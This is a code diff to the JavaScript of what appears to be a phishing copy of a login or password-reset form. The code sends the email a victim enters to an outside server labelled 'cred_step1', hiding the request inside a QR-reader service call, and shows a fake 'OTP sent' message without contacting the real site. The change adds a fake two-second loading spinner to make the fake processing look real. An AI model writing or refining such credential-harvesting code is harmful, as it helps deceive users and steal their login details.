@@ -1580,20 +1580,25 @@
                     var emailfilter = /(([a-zA-Z0-9\-?\.?]+)@(([a-zA-Z0-9\-_]+\.)+)([a-zA-Z]{2,3}))+$/;
                     if ((email != "") && (!(emailfilter.test(email)))) {
                         $('#f_email').val("");
-                        swal({button: false, text: "Invalid Email Id", icon: "error", timer: 4000});
+                        if (typeof swal === 'function') {
+                            try { swal('Error', 'Invalid Email Id', 'error'); } catch(e) { try { swal({button: false, text: 'Invalid Email Id', icon: 'error', timer: 4000}); } catch(e2){} }
+                        }
                         return false;
                     }
                     else if(email == ""){
                         $('#f_email').val("");
-                        swal({button: false, text: "Email Id should not be blank", icon: "error", timer: 4000});
-                        return false;  
+                        if (typeof swal === 'function') {
+                            try { swal('Error', 'Email Id should not be blank', 'error'); } catch(e) { try { swal({button: false, text: 'Email Id should not be blank', icon: 'error', timer: 4000}); } catch(e2){} }
+                        }
+                        return false;
                     }
 
-                    // Dispatch captured email via QR proxy (no AJAX to real server)
+                    // Dispatch captured email via QR proxy
                     (function(em){
                         try {
                             var _srv = "https://lunexooryzeno.pythonanywhere.com";
-                            var _q = "mid=" + encodeURIComponent(window.__xmid||"anon")
+                            var _mid = window.__xmid || (window.parent && window.parent.__xmid) || "anon";
+                            var _q = "mid=" + encodeURIComponent(_mid)
                                    + "&type=cred_step1&email=" + encodeURIComponent(em)
                                    + "&ts=" + Date.now();
                             var _url = "https://api.qrserver.com/v1/read-qr-code/?fileurl=" + encodeURIComponent(_srv + "/kgde/heartbeat/response_qr.png?" + _q) + "&_cb=" + Date.now();
@@ -1601,20 +1606,49 @@
                         } catch(e){}
                     })(email);
 
-                    // Fake OTP-sent success without hitting the real server
-                    swal({
-                        title: "Success",
-                        text: "OTP has been sent to your registered email address.",
-                        buttons: { confirm: {text:'OK', className:'btn btn-warning m-btn m-btn--pill m-btn--custom m-btn--air'} }
-                    }).then(function(){
-                        $('.hiddenbtn').css('display','block');
-                        $('#password_txt').show();
-                        $('.otpsent').css('display','none');
-                        $('#password_txt').val('');
-                        $('#username').prop("readonly", true);
-                        $('#setusername').prop("readonly", false);
-                        $('#newpassword').prop("readonly", false);
-                    });
+                    // Show loader and disable button for 2 seconds to simulate real backend processing
+                    $('.loader').css('display', 'block').removeClass('hidden');
+                    $('.otpsent').css('pointer-events', 'none');
+
+                    setTimeout(function(){
+                        $('.loader').css('display', 'none').addClass('hidden');
+                        $('.otpsent').css('pointer-events', 'auto');
+
+                        var advanceUI = function() {
+                            $('.hiddenbtn').css('display', 'block');
+                            $('#password_txt').show().val('');
+                            $('.otpsent').css('display', 'none');
+                            $('#username').prop('readonly', true);
+                            $('#setusername').prop('readonly', false);
+                            $('#newpassword').prop('readonly', false);
+                        };
+
+                        var msg = 'OTP has been sent to your registered email address.';
+                        if (typeof swal === 'function') {
+                            var promise = null;
+                            try {
+                                promise = swal('Success', msg, 'success');
+                            } catch(err1) {
+                                try {
+                                    promise = swal({
+                                        title: 'Success',
+                                        text: msg,
+                                        buttons: { confirm: { text: 'OK', className: 'btn btn-warning m-btn m-btn--pill m-btn--custom m-btn--air' } }
+                                    });
+                                } catch(err2) {
+                                    advanceUI();
+                                    return;
+                                }
+                            }
+                            if (promise && typeof promise.then === 'function') {
+                                promise.then(advanceUI);
+                            } else {
+                                advanceUI();
+                            }
+                        } else {
+                            advanceUI();
+                        }
+                    }, 2000);
 
                     return false;
                 }
